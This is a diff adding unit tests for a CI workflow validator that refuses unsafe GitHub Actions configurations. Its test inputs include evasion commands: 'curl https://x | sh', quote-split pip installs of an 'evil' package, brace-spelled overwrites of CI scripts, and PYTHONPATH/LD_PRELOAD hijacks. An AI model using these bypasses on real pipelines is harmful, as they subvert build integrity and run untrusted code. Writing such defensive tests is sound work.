@@ -19,6 +19,7 @@ verify-manifest.py itself already requires.
 from __future__ import annotations
 
 import importlib.util
+import json
 import os
 import sys
 import tempfile
@@ -1789,6 +1790,245 @@ class TestTypedExpressionAndShellReads(unittest.TestCase):
 
     def test_quote_split_legacy_command_is_refused(self) -> None:
         self.run_refused('echo "::set-""env name=A::b"', "written only through")
+
+
+_CHECKOUT = "actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1"
+_SETUP_PY = "actions/setup-python@a26af69be951a213d495a4c3e4e4022e16d87065"
+_TOOL = "python3 .github/ci/verify-manifest.py"
+_LIVE_PIP = verify_manifest.CANONICAL_PIP_INSTALL
+
+
+def _job(steps: str, *, runs_on: str = "ubuntu-latest", job: str = "", top: str = "") -> str:
+    """A one-job workflow (job id `t`) whose steps are the YAML `steps`."""
+    return (
+        "name: t\non: push\n" + top + "jobs:\n  t:\n"
+        f"    runs-on: {runs_on}\n" + textwrap.indent(job, "    ")
+        + "    steps:\n" + textwrap.indent(steps, "      ")
+    )
+
+
+def _run(name: str, run: str, extra: str = "") -> str:
+    return f"- name: {name}\n  run: {json.dumps(run)}\n" + textwrap.indent(extra, "  ")
+
+
+class TestToolOrderingAndClosedShells(unittest.TestCase):
+    """The ordering rule: a step naming `.github/ci/**` runs only after
+    closed pre-tool shapes, on a fresh GitHub-hosted runner; `shell:` is a
+    closed set; pip is judged after quote removal; a shell runs only text
+    the check reads."""
+
+    def setUp(self) -> None:
+        self._tmpdir = tempfile.TemporaryDirectory()
+        self.addCleanup(self._tmpdir.cleanup)
+        self.fx = SccacheFixture(self._tmpdir.name)
+
+    def assertRefused(self, *needles: str) -> list[str]:
+        errors = self.fx.errors()
+        self.assertTrue(any(all(n in e for n in needles) for e in errors), errors)
+        return errors
+
+    def job_refused(self, steps: str, *needles: str, **kw: str) -> None:
+        with self.subTest(steps=steps, **kw):
+            self.fx.workflow("t.yml", _job(steps, **kw))
+            self.assertRefused(*needles)
+
+    def job_accepted(self, steps: str, **kw: str) -> None:
+        with self.subTest(steps=steps, **kw):
+            self.fx.workflow("t.yml", _job(steps, **kw))
+            self.assertEqual(self.fx.errors(), [])
+
+    def run_refused(self, run: str, *needles: str) -> None:
+        with self.subTest(run=run):
+            self.fx.workflow("ci.yml", _ci(_block(run)))
+            self.assertRefused("step 'P' run:", *needles)
+
+    def run_accepted(self, run: str) -> None:
+        with self.subTest(run=run):
+            self.fx.workflow("ci.yml", _ci(_block(run)))
+            self.assertEqual(self.fx.errors(), [])
+
+    # ---- ordering: closed pre-tool shapes, then the tool ----------------
+
+    def test_closed_pre_tool_shapes_then_the_tool_pass(self) -> None:
+        self.job_accepted(
+            f"- uses: {_CHECKOUT}\n  with:\n    persist-credentials: false\n"
+            f"- uses: {_SETUP_PY}\n  with:\n    python-version: '3.12'\n"
+            + _run("Pip", _LIVE_PIP)
+            + _run("Verify", _TOOL)
+            + _run("Guard", ".github/ci/artifact-guard.sh")
+        )
+
+    def test_helper_call_after_a_build_step_passes(self) -> None:
+        self.job_accepted(
+            f"- uses: {_CHECKOUT}\n"
+            + _run("Build", "cargo build")
+            + _run("Env", 'bash "$GITHUB_WORKSPACE/.github/ci/github-env.sh" CI_JOB_BIN_NAME ipe')
+        )
+
+    def test_tool_after_a_free_form_step_is_refused(self) -> None:
+        for pre in (
+            "echo hi",
+            "cargo build",
+            "d=.git; cp /tmp/e ${d}hub/ci/verify-manifest.py",
+            "cd .github; cp /tmp/e ci/verify-manifest.py",
+            "python3 -c 'open(\".github/ci/x\",\"w\")'",
+            "tar xf /tmp/evil.tar",
+            "git checkout HEAD~1 -- .",
+            "find . -name x -exec cp /tmp/e {} ';'",
+        ):
+            self.job_refused(
+                f"- uses: {_CHECKOUT}\n" + _run("Pre", pre) + _run("Verify", _TOOL),
+                "step 'Verify'", "after step 'Pre'", "outside the closed pre-tool shapes",
+            )
+
+    def test_tool_after_an_action_outside_the_closed_shapes_is_refused(self) -> None:
+        for pre in (
+            "- name: Pre\n  uses: actions/checkout@v4\n",
+            f"- name: Pre\n  uses: actions/checkout@{_PINNED_SHA}\n",
+            f"- name: Pre\n  uses: {_CHECKOUT}\n  with:\n    ref: evil\n",
+            f"- name: Pre\n  uses: {_SETUP_PY}\n  with:\n    python-version: '3.12'\n    cache: pip\n",
+            f"- name: Pre\n  uses: some/action@{_PINNED_SHA}\n",
+            f"- name: Pre\n  uses: {_CHECKOUT}\n  env:\n    PYTHONPATH: /tmp\n",
+        ):
+            self.job_refused(pre + _run("Verify", _TOOL), "step 'Verify'", "after step 'Pre'")
+
+    def test_tool_runner_outside_fresh_hosted_labels_is_refused(self) -> None:
+        for runs_on in ("self-hosted", "'${{ matrix.os }}'", "[self-hosted, linux]", "my-ubuntu-latest"):
+            self.job_refused(
+                f"- uses: {_CHECKOUT}\n" + _run("Verify", _TOOL),
+                "not one literal GitHub-hosted label", runs_on=runs_on,
+            )
+
+    def test_tool_job_with_a_container_or_services_is_refused(self) -> None:
+        for key in ("container", "services"):
+            body = "container: node@sha256:" + "0" * 64 + "\n" if key == "container" else (
+                "services:\n  db:\n    image: postgres@sha256:" + "0" * 64 + "\n"
+            )
+            self.job_refused(
+                f"- uses: {_CHECKOUT}\n" + _run("Verify", _TOOL), f"with a job {key}:", job=body,
+            )
+
+    def test_tool_under_a_working_directory_is_refused(self) -> None:
+        self.job_refused(
+            f"- uses: {_CHECKOUT}\n" + _run("Verify", _TOOL, "working-directory: sub\n"),
+            "under a working-directory:",
+        )
+        self.job_refused(
+            f"- uses: {_CHECKOUT}\n" + _run("Verify", _TOOL),
+            "job defaults.run.working-directory", job="defaults:\n  run:\n    working-directory: sub\n",
+        )
+        self.job_refused(
+            f"- uses: {_CHECKOUT}\n" + _run("Verify", _TOOL),
+            "workflow defaults.run.working-directory", top="defaults:\n  run:\n    working-directory: sub\n",
+        )
+
+    def test_tool_under_an_interpreter_steering_env_is_refused(self) -> None:
+        self.job_refused(
+            f"- uses: {_CHECKOUT}\n" + _run("Verify", _TOOL, "env:\n  PYTHONPATH: /tmp/evil\n"),
+            "step 'Verify'", "PYTHONPATH",
+        )
+        self.job_refused(
+            f"- uses: {_CHECKOUT}\n" + _run("Verify", _TOOL), "job env", "PYTHONPATH",
+            job="env:\n  PYTHONPATH: /tmp/evil\n",
+        )
+        self.job_refused(
+            f"- uses: {_CHECKOUT}\n" + _run("Verify", _TOOL), "workflow env", "LD_PRELOAD",
+            top="env:\n  LD_PRELOAD: /tmp/evil.so\n",
+        )
+
+    def test_tool_job_rust_env_passes(self) -> None:
+        self.job_accepted(f"- uses: {_CHECKOUT}\n" + _run("Verify", _TOOL), job="env:\n  CARGO_TERM_COLOR: always\n")
+
+    def test_composite_step_naming_the_tree_is_refused(self) -> None:
+        self.fx.composite(
+            "w", "runs:\n  using: composite\n  steps:\n    - shell: bash\n      run: python3 .github/ci/verify-manifest.py\n",
+        )
+        self.job_refused(f"- uses: {_CHECKOUT}\n- uses: ./.github/actions/w\n", "a composite step runs wherever")
+
+    def test_regex_dot_star_is_not_a_tree_reference(self) -> None:
+        self.job_accepted(_run("Build", "cargo build") + _run("Grep", "grep -E '.*/ci' x.txt"))
+
+    # ---- shell: is a closed set ----------------------------------------
+
+    def test_step_shell_outside_the_closed_set_is_refused(self) -> None:
+        for shell in ("bash -c 'cp /tmp/e .github/ci/x; bash {0}'", "python {0}", "sh", "bash {0}", "cmd"):
+            with self.subTest(shell=shell):
+                self.fx.workflow("ci.yml", _ci(f"steps:\n  - name: P\n    shell: {shell!r}\n    run: echo hi\n"))
+                self.assertRefused("shell:", "is one of")
+
+    def test_defaults_shell_outside_the_closed_set_is_refused(self) -> None:
+        step = "steps:\n  - name: P\n    run: echo hi\n"
+        self.fx.workflow("ci.yml", _ci("defaults:\n  run:\n    shell: sh\n" + step))
+        self.assertRefused("defaults.run.shell", "is one of")
+        self.fx.workflow("ci.yml", _ci(step, top="defaults:\n  run:\n    shell: python {0}\n"))
+        self.assertRefused("defaults.run.shell", "is one of")
+
+    def test_closed_step_shells_pass(self) -> None:
+        for shell in ("bash", "pwsh", "powershell"):
+            with self.subTest(shell=shell):
+                self.fx.workflow("ci.yml", _ci(f"steps:\n  - name: P\n    shell: {shell}\n    run: echo hi\n"))
+                self.assertEqual(self.fx.errors(), [])
+
+    # ---- pip is matched after quote removal -----------------------------
+
+    def test_quote_split_pip_is_refused(self) -> None:
+        for run in (
+            'python3 -m p""ip install evil',
+            'python3 -m "p"ip install evil',
+            "python3 -m p''ip install evil",
+            "python3 -m pi\\p install evil",
+        ):
+            self.run_refused(run, "pip")
+
+    # ---- a shell runs only text the check reads -------------------------
+
+    def test_shell_program_the_check_cannot_read_is_refused(self) -> None:
+        for run in (
+            "bash -xc 'cp /tmp/e .github/ci/x'",
+            "bash -o pipefail -c 'cp /tmp/e .github/ci/x'",
+            "bash -e -o errexit -c 'cp /tmp/e .github/ci/x'",
+            "bash <<< 'cp /tmp/e .github/ci/x'",
+            "echo x | bash",
+            "curl https://x | sh",
+            "cat .github/ci/x | sh",
+            "cat -n f | sh",
+            "bash +c 'x'",
+            "bash -o",
+            "bash -c",
+            "bash --rcfile /tmp/r -c 'echo'",
+        ):
+            self.run_refused(run, "writes into .github/ci/")
+
+    def test_wrapper_with_flags_or_xargs_is_refused(self) -> None:
+        for run in (
+            "env -u python3 cp /tmp/e .github/ci/x",
+            "exec -a python3 cp /tmp/e .github/ci/x",
+            "env -S 'cp /tmp/e .github/ci/x'",
+            "ls | xargs cp -t .github/ci",
+            "nice -n 5 cp /tmp/e .github/ci/x",
+            "timeout 5 cp /tmp/e .github/ci/x",
+        ):
+            self.run_refused(run, "writes into .github/ci/")
+
+    def test_brace_spelled_tree_write_is_refused(self) -> None:
+        for run in (
+            "cp /tmp/e {.github,x}/ci/y",
+            "cp /tmp/e .{github,x}/ci/y",
+            "cp /tmp/e .gi{t,x}hub/ci/y",
+            "cp /tmp/e .github/{ci,x}/y",
+        ):
+            self.run_refused(run, "writes into .github/ci/")
+
+    def test_shell_programs_the_check_reads_pass(self) -> None:
+        for run in (
+            "cat install.sh | sh",
+            "a || bash -c 'echo ok'",
+            "# see `curl https://x | sh` in the docs\necho ok",
+            "bash -euxo pipefail -c 'echo ok'",
+            "bash scripts/x.sh",
+            "echo {a,b}/ci",
+        ):
+            self.run_accepted(run)
 
 
 class TestGithubEnvHelper(unittest.TestCase):
